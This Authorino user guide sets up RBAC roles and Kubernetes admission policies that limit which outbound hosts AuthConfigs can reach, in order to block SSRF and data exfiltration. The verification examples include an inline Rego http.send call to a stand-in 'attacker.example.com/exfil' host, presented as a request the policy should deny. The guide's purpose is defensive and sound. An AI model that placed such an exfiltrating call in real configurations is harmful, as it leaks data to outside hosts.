# User guide: Restricting the outbound HTTP routes Authorino can reach (AuthConfigs)

Several fields on an `AuthConfig` tell Authorino to make an **outbound request to a
host of the author's choosing**.

Because Authorino runs with its own network identity and credentials, anyone
allowed to create `AuthConfig`s in a single namespace can point Authorino at any
host reachable from the pod and have Authorino make the request on their behalf.
This creates a possible situation where attacker can create malicious AuthConfig
in order to reach cloud metadata endpoints, internal-only services, or to exfiltrate data.

The three ValidatingAdmissionPolicies below close that gap. They turn every
outbound destination into an **explicit, RBAC-gated allowlist**: an `AuthConfig`
may only name a host that the requesting subject has been granted access to,
inline Rego may only use `http.send` if the subject has been granted a dedicated
permission, and an OPA policy may only be loaded from an external source if the
subject has been granted a dedicated permission (its Rego is fetched at runtime
and cannot be scanned for `http.send` at admission time). You hand those
permissions only to the subjects that need them to do their job.

The policies:

| Policy | Resource | Denies | Permission required to allow |
| --- | --- | --- | --- |
| `authorino-restrict-http-route` | `authconfigs` | any outbound endpoint whose hostname the subject has not been granted (JWT `jwksUrl` / `issuerUrl`, OAuth2 introspection `endpoint`, UserInfo `userInfoUrl`, UMA `endpoint`, metadata/callback `http.url` + `http.oauth2.tokenUrl`, OPA `opa.externalPolicy` URL, SpiceDB `endpoint`) | `access` on `http-resource/<hostname>` |
| `authorino-restrict-http-route` | `authconfigs` | endpoints whose host cannot be statically verified: a dynamic `urlExpression`, or a URL with a templated `{...}` hostname | *(none — always denied; use a literal hostname instead)* |
| `authorino-deny-rego-httpsend` | `authconfigs` | inline OPA/Rego (`spec.authorization.*.opa.rego`) that uses the `http.send` builtin | `use` on `authconfig-httpsend` |
| `authorino-deny-external-opa` | `authconfigs` | OPA policies loaded from an external source (`spec.authorization.*.opa.externalPolicy`), whose Rego is fetched at runtime and cannot be scanned for `http.send` at admission time | `use` on `authconfig-external-opa` |


## Prerequisites

> **Important**
>
> These manifests require **Kubernetes v1.30 or newer**. They use
> `ValidatingAdmissionPolicy` via the stable `admissionregistration.k8s.io/v1`
> API, which is only available from v1.30 (where the feature graduated to GA),
> along with the CEL `authorizer` library the policies rely on. On older
> clusters these resources will not apply.

## 1. Create the Roles

Create one `ClusterRole` per host you want to be able to allow (the RBAC resource
name is `http-resource/<hostname>`), plus one `ClusterRole` for the inline-Rego
`http.send` permission and one for loading OPA policies from an external source.

```bash
kubectl apply -f - <<'EOF'
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: authorino-http-route-keycloak-example-com
rules:
  - apiGroups: ["authorino.kuadrant.io"]
    resources: ["http-resource/keycloak.example.com"]
    verbs: ["access"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: authorino-httpsend
rules:
  - apiGroups: ["authorino.kuadrant.io"]
    resources: ["authconfig-httpsend"]
    verbs: ["use"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: authorino-external-opa
rules:
  - apiGroups: ["authorino.kuadrant.io"]
    resources: ["authconfig-external-opa"]
    verbs: ["use"]
EOF
```

## 2. Grant the access to the restricted destinations

Grant the host-access, `http.send`, and external-OPA permissions to your own
ServiceAccounts and Users. Use the RoleBindings below as a template. Replace the
placeholders (`<sa-name>`, `<namespace-of-sa>`, `<authconfig-namespace>`) with the
appropriate values.



```bash
kubectl apply -f - <<'EOF'
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: rb-http-route-keycloak
  namespace: <authconfig-namespace>
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: authorino-http-route-keycloak-example-com
subjects:
  - kind: ServiceAccount
    name: <sa-name>
    namespace: <namespace-of-sa>
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: rb-httpsend
  namespace: <authconfig-namespace>
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: authorino-httpsend
subjects:
  - kind: ServiceAccount
    name: <sa-name>
    namespace: <namespace-of-sa>
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: rb-external-opa
  namespace: <authconfig-namespace>
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: authorino-external-opa
subjects:
  - kind: ServiceAccount
    name: <sa-name>
    namespace: <namespace-of-sa>
EOF
```

## 3. Create the ValidatingAdmissionPolicies (VAPs)

Apply the three policies below.

```bash
kubectl apply -f - <<'EOF'
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingAdmissionPolicy
metadata:
  name: authorino-restrict-http-route
spec:
  failurePolicy: Fail
  matchConstraints:
    resourceRules:
      - apiGroups: ["authorino.kuadrant.io"]
        apiVersions: ["v1beta3"]
        operations: ["CREATE", "UPDATE"]
        resources: ["authconfigs"]
  variables:
    - name: metadataHttp
      expression: >-
        has(object.spec.metadata)
        ? object.spec.metadata.map(k, object.spec.metadata[k]).filter(m, has(m.http)).map(m, m.http)
        : []
    - name: callbackHttp
      expression: >-
        has(object.spec.callbacks)
        ? object.spec.callbacks.map(k, object.spec.callbacks[k]).filter(c, has(c.http)).map(c, c.http)
        : []
    - name: opaExternalHttp
      expression: >-
        has(object.spec.authorization)
        ? object.spec.authorization.map(k, object.spec.authorization[k]).filter(a, has(a.opa) && has(a.opa.externalPolicy)).map(a, a.opa.externalPolicy)
        : []
    - name: httpEndpoints
      expression: variables.metadataHttp + variables.callbackHttp + variables.opaExternalHttp
    - name: httpUrls
      expression: >-
        variables.httpEndpoints.filter(e, has(e.url) && e.url != "").map(e, e.url)
    - name: httpTokenUrls
      expression: >-
        variables.httpEndpoints.filter(e, has(e.oauth2) && has(e.oauth2.tokenUrl) && e.oauth2.tokenUrl != "").map(e, e.oauth2.tokenUrl)
    - name: jwksUrls
      expression: >-
        has(object.spec.authentication)
        ? object.spec.authentication.map(k, object.spec.authentication[k]).filter(a, has(a.jwt) && has(a.jwt.jwksUrl) && a.jwt.jwksUrl != "").map(a, a.jwt.jwksUrl)
        : []
    - name: issuerUrls
      expression: >-
        has(object.spec.authentication)
        ? object.spec.authentication.map(k, object.spec.authentication[k]).filter(a, has(a.jwt) && has(a.jwt.issuerUrl) && a.jwt.issuerUrl != "").map(a, a.jwt.issuerUrl)
        : []
    - name: introspectionUrls
      expression: >-
        has(object.spec.authentication)
        ? object.spec.authentication.map(k, object.spec.authentication[k]).filter(a, has(a.oauth2Introspection) && has(a.oauth2Introspection.endpoint) && a.oauth2Introspection.endpoint != "").map(a, a.oauth2Introspection.endpoint)
        : []
    - name: userInfoUrls
      expression: >-
        has(object.spec.metadata)
        ? object.spec.metadata.map(k, object.spec.metadata[k]).filter(m, has(m.userInfo) && has(m.userInfo.userInfoUrl) && m.userInfo.userInfoUrl != "").map(m, m.userInfo.userInfoUrl)
        : []
    - name: umaUrls
      expression: >-
        has(object.spec.metadata)
        ? object.spec.metadata.map(k, object.spec.metadata[k]).filter(m, has(m.uma) && has(m.uma.endpoint) && m.uma.endpoint != "").map(m, m.uma.endpoint)
        : []
    - name: allUrls
      expression: >-
        variables.httpUrls + variables.httpTokenUrls
        + variables.jwksUrls + variables.issuerUrls + variables.introspectionUrls
        + variables.userInfoUrls + variables.umaUrls
    - name: spicedbEndpoints
      expression: >-
        has(object.spec.authorization)
        ? object.spec.authorization.map(k, object.spec.authorization[k]).filter(a, has(a.spicedb) && has(a.spicedb.endpoint) && a.spicedb.endpoint != "").map(a, a.spicedb.endpoint)
        : []
    - name: spicedbHosts
      expression: >-
        variables.spicedbEndpoints.map(e, url("grpc://" + e).getHostname())
    - name: hasUrlExpression
      expression: >-
        variables.httpEndpoints.exists(e, has(e.urlExpression) && e.urlExpression != "")
    - name: hasUnparseableUrl
      expression: >-
        variables.allUrls.exists(u, !isURL(u) || url(u).getHostname() == "" || url(u).getHostname().contains("{"))
        || variables.spicedbHosts.exists(h, h == "" || h.contains("{"))
    - name: hasUnverifiableEndpoint
      expression: variables.hasUrlExpression || variables.hasUnparseableUrl
    - name: requestedHosts
      expression: >-
        variables.allUrls.filter(u, isURL(u) && url(u).getHostname() != "" && !url(u).getHostname().contains("{")).map(u, url(u).getHostname())
        + variables.spicedbHosts.filter(h, h != "" && !h.contains("{"))
    - name: deniedHosts
      expression: >-
        variables.requestedHosts.filter(h,
        !authorizer.group("authorino.kuadrant.io")
        .resource("http-resource")
        .subresource(h)
        .namespace(object.metadata.namespace)
        .check("access")
        .allowed())
  validations:
    - expression: "!variables.hasUnverifiableEndpoint"
      reason: Forbidden
      message: "outbound URLs (authentication/metadata/authorization/callback) must use a static endpoint with a literal hostname so it can be checked against the hostname whitelist (dynamic 'urlExpression' or templated '{selector}' hosts are not allowed)"
    - expression: "size(variables.deniedHosts) == 0"
      reason: Forbidden
      message: "you do not have a role that allows Authorino to make requests to one or more of the configured hostnames"
      messageExpression: '"no role allows request to host(s): " + variables.deniedHosts.join(", ")'
---
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingAdmissionPolicyBinding
metadata:
  name: authorino-restrict-http-route
spec:
  policyName: authorino-restrict-http-route
  validationActions: ["Deny"]
---
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingAdmissionPolicy
metadata:
  name: authorino-deny-rego-httpsend
spec:
  failurePolicy: Fail
  matchConstraints:
    resourceRules:
      - apiGroups: ["authorino.kuadrant.io"]
        apiVersions: ["v1beta3"]
        operations: ["CREATE", "UPDATE"]
        resources: ["authconfigs"]
  matchConditions:
    - name: user-not-httpsend-exempt
      expression: >-
        !authorizer.group("authorino.kuadrant.io")
        .resource("authconfig-httpsend")
        .namespace(object.metadata.namespace)
        .check("use")
        .allowed()
  variables:
    - name: usesHttpSend
      expression: >-
        has(object.spec.authorization)
        && object.spec.authorization.exists(k,
        has(object.spec.authorization[k].opa)
        && has(object.spec.authorization[k].opa.rego)
        && object.spec.authorization[k].opa.rego.contains("http.send"))
  validations:
    - expression: "!variables.usesHttpSend"
      reason: Forbidden
      message: "inline OPA/Rego policies (spec.authorization[*].opa.rego) must not use the 'http.send' builtin, which lets Authorino make arbitrary outbound HTTP requests (SSRF). Fetch external data via a metadata HTTP source with an allowlisted hostname instead, or ask an admin for the 'authconfig-httpsend' role."
---
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingAdmissionPolicyBinding
metadata:
  name: authorino-deny-rego-httpsend
spec:
  policyName: authorino-deny-rego-httpsend
  validationActions: ["Deny"]
---
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingAdmissionPolicy
metadata:
  name: authorino-deny-external-opa
spec:
  failurePolicy: Fail
  matchConstraints:
    resourceRules:
      - apiGroups: ["authorino.kuadrant.io"]
        apiVersions: ["v1beta3"]
        operations: ["CREATE", "UPDATE"]
        resources: ["authconfigs"]
  matchConditions:
    - name: user-not-external-opa-exempt
      expression: >-
        !authorizer.group("authorino.kuadrant.io")
        .resource("authconfig-external-opa")
        .namespace(object.metadata.namespace)
        .check("use")
        .allowed()
  variables:
    - name: usesExternalOpa
      expression: >-
        has(object.spec.authorization)
        && object.spec.authorization.exists(k,
        has(object.spec.authorization[k].opa)
        && has(object.spec.authorization[k].opa.externalPolicy))
  validations:
    - expression: "!variables.usesExternalOpa"
      reason: Forbidden
      message: "OPA policies loaded from an external source (spec.authorization[*].opa.externalPolicy) are not allowed: the Rego is fetched at runtime and cannot be scanned for the 'http.send' builtin at admission time (SSRF). Use an inline 'rego' policy, which is scanned, or ask an admin for the 'authconfig-external-opa' role."
---
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingAdmissionPolicyBinding
metadata:
  name: authorino-deny-external-opa
spec:
  policyName: authorino-deny-external-opa
  validationActions: ["Deny"]
EOF
```

> **Warning**
>
> Unlike a policy that only restricts *newly enabling* a field, all three policies
> re-validate the **entire object** on every `CREATE` **and** `UPDATE`, with no
> comparison to the previous version:
>
> - `authorino-restrict-http-route` requires the requesting subject to hold
    >   `access` for **every** hostname currently in the `AuthConfig` — even on an
    >   update that does not touch the URLs. An `AuthConfig` that already points at a
    >   host will become **uneditable by a subject that lacks that host's role**, and
    >   `http.send`-bearing configs behave the same way for `authorino-deny-rego-httpsend`, and configs using `opa.externalPolicy` behave the same way for `authorino-deny-external-opa`.
> - Applying the policies does **not** retroactively delete existing
    >   `AuthConfig`s, but the next update to one is re-checked in full.
>
> Before you apply the policies, **inventory the hostnames already in use** and
> the controllers/ServiceAccounts that manage `AuthConfig`s (e.g. GitOps
> controllers, the Kuadrant operator), and grant them the matching host roles
> (steps 1–2) so their reconciliations keep working. Cluster administrators with
> wildcard access are implicitly exempt (see the note in step 4).
>

## 4. Verifying the VAPs

### A normal user is blocked

Try to create resources that break the rules. Run these as a regular user (one
without the permissions) and each should be rejected.

> **Note**
>
> Do not run these as a cluster administrator. Anything with wildcard access
> (`verbs: ["*"]` on `resources: ["*"]`) — which cluster admins have — satisfies
> the `access` / `use` checks and is treated as exempt, so the request would be
> allowed and a real outbound route enabled. Use an ordinary user (or
> `--as=<unauthorized-subject>`) to see the policy block.

```bash
# AuthConfig pointing JWKS at a host the subject was not granted — should be DENIED
kubectl apply --as=<unauthorized-subject> -f - <<'EOF'
apiVersion: authorino.kuadrant.io/v1beta3
kind: AuthConfig
metadata:
  name: route-denied-1
  namespace: <namespace>
spec:
  hosts:
    - test-denied.example.com
  authentication:
    jwt-users:
      jwt:
        issuerUrl: https://not-allowed.example.com/realms/app
EOF
```

```bash
# Inline OPA/Rego that uses http.send — should be DENIED
kubectl apply --as=<unauthorized-subject> -f - <<'EOF'
apiVersion: authorino.kuadrant.io/v1beta3
kind: AuthConfig
metadata:
  name: route-denied-httpsend
  namespace: <namespace>
spec:
  hosts:
    - test-httpsend-denied.example.com
  authorization:
    external-check:
      opa:
        rego: |
          resp := http.send({"method": "get", "url": "https://attacker.example.com/exfil"})
          allow { resp.status_code == 200 }
EOF
```

```bash
# OPA policy loaded from an external source, without the external-OPA role — should be DENIED
kubectl apply --as=<unauthorized-subject> -f - <<'EOF'
apiVersion: authorino.kuadrant.io/v1beta3
kind: AuthConfig
metadata:
  name: route-denied-external-opa
  namespace: <namespace>
spec:
  hosts:
    - test-external-opa-denied.example.com
  authorization:
    external-check:
      opa:
        externalPolicy:
          url: https://keycloak.example.com/policy.rego
EOF
```

You should get errors like these instead of the resources being created:

```text
... is forbidden: ValidatingAdmissionPolicy 'authorino-restrict-http-route' ... denied request: no role allows request to host(s): not-allowed.example.com
```

```text
... is forbidden: ValidatingAdmissionPolicy 'authorino-deny-rego-httpsend' ... denied request: inline OPA/Rego policies (spec.authorization[*].opa.rego) must not use the 'http.send' builtin ...
```

```text
... is forbidden: ValidatingAdmissionPolicy 'authorino-deny-external-opa' ... denied request: OPA policies loaded from an external source (spec.authorization[*].opa.externalPolicy) are not allowed ...
```

### A permitted subject is allowed

Now run the same requests as a subject that holds the matching permission
(granted in steps 1–2). All should be admitted. Replace `<authorized-subject>`
with the subject you granted the permission to (for example,
`system:serviceaccount:<namespace>:<sa>`), and make sure you granted the role for
the exact hostname used below. Note that an external OPA policy is admitted only
when the subject holds **both** the `authconfig-external-opa` role **and** the
host role for the policy's URL (here, `keycloak.example.com`).

```bash
# JWT issuer at an allowlisted host, as a subject granted access to it — should be ALLOWED
kubectl apply --as=<authorized-subject> -f - <<'EOF'
apiVersion: authorino.kuadrant.io/v1beta3
kind: AuthConfig
metadata:
  name: route-allowed-1
  namespace: <namespace>
spec:
  hosts:
    - test-allowed.example.com
  authentication:
    jwt-users:
      jwt:
        issuerUrl: https://keycloak.example.com/realms/app
EOF
```

```bash
# Inline OPA/Rego using http.send, as a subject granted 'authconfig-httpsend' — should be ALLOWED
kubectl apply --as=<authorized-subject> -f - <<'EOF'
apiVersion: authorino.kuadrant.io/v1beta3
kind: AuthConfig
metadata:
  name: route-allowed-httpsend
  namespace: <namespace>
spec:
  hosts:
    - test-httpsend-allowed.example.com
  authorization:
    external-check:
      opa:
        rego: |
          resp := http.send({"method": "get", "url": "https://keycloak.example.com/check"})
          allow { resp.status_code == 200 }
EOF
```

```bash
# OPA policy from an external source at an allowlisted host, as a subject granted
# both 'authconfig-external-opa' and the keycloak.example.com host role — should be ALLOWED
kubectl apply --as=<authorized-subject> -f - <<'EOF'
apiVersion: authorino.kuadrant.io/v1beta3
kind: AuthConfig
metadata:
  name: route-allowed-external-opa
  namespace: <namespace>
spec:
  hosts:
    - test-external-opa-allowed.example.com
  authorization:
    external-check:
      opa:
        externalPolicy:
          url: https://keycloak.example.com/policy.rego
EOF
```

### Resources without outbound endpoints are always allowed

The `authorino-restrict-http-route` policy only looks at fields that produce an
outbound request. An `AuthConfig` that makes no external call — for example one
that only verifies API keys, mTLS certificates, or Kubernetes tokens, and uses
inline pattern-matching authorization — is admitted for any subject, whether or
not it holds a host role:

```bash
# AuthConfig with no outbound endpoints — should be ALLOWED even for an unauthorized subject
kubectl apply --as=<unauthorized-subject> -f - <<'EOF'
apiVersion: authorino.kuadrant.io/v1beta3
kind: AuthConfig
metadata:
  name: route-none
  namespace: <namespace>
spec:
  hosts:
    - test-no-route.example.com
  authentication:
    api-key-users:
      apiKey:
        selector:
          matchLabels:
            group: friends
EOF
```



### Updates are re-checked, not just creates

Because the policies match `UPDATE` as well as `CREATE`, and they validate the
whole object each time, a subject that lacks a host's role cannot edit an
`AuthConfig` that references that host — even to change an unrelated field. Using
the `route-allowed-1` `AuthConfig` created above (which points at
`keycloak.example.com`):

```bash
# Change an unrelated field (the host) while keeping the same issuer,
# as a subject WITHOUT the keycloak.example.com role — should be DENIED
kubectl apply --as=<unauthorized-subject> -f - <<'EOF'
apiVersion: authorino.kuadrant.io/v1beta3
kind: AuthConfig
metadata:
  name: route-allowed-1
  namespace: <namespace>
spec:
  hosts:
    - test-allowed-updated.example.com
  authentication:
    jwt-users:
      jwt:
        issuerUrl: https://keycloak.example.com/realms/app
EOF
```

The same edit performed by a subject that **does** hold the
`keycloak.example.com` role is admitted. Grant the host roles to every subject
that legitimately maintains these `AuthConfig`s.

### Permissions bound with a RoleBinding are namespace-scoped

The exemption check runs against the **namespace of the resource being admitted**.
If you grant a permission with a `RoleBinding` (rather than a
`ClusterRoleBinding`), the subject is allowed only in that namespace.

```bash
# Subject granted the keycloak.example.com role via a RoleBinding in <namespace-a> — should be ALLOWED
kubectl apply --as=<authorized-subject> -f - <<'EOF'
apiVersion: authorino.kuadrant.io/v1beta3
kind: AuthConfig
metadata:
  name: route-rb-a
  namespace: <namespace-a>
spec:
  hosts:
    - test-rb-a.example.com
  authentication:
    jwt-users:
      jwt:
        issuerUrl: https://keycloak.example.com/realms/app
EOF
```

```bash
# Same subject, same request, in <namespace-b> where it has no binding — should be DENIED
kubectl apply --as=<authorized-subject> -f - <<'EOF'
apiVersion: authorino.kuadrant.io/v1beta3
kind: AuthConfig
metadata:
  name: route-rb-b
  namespace: <namespace-b>
spec:
  hosts:
    - test-rb-b.example.com
  authentication:
    jwt-users:
      jwt:
        issuerUrl: https://keycloak.example.com/realms/app
EOF
```
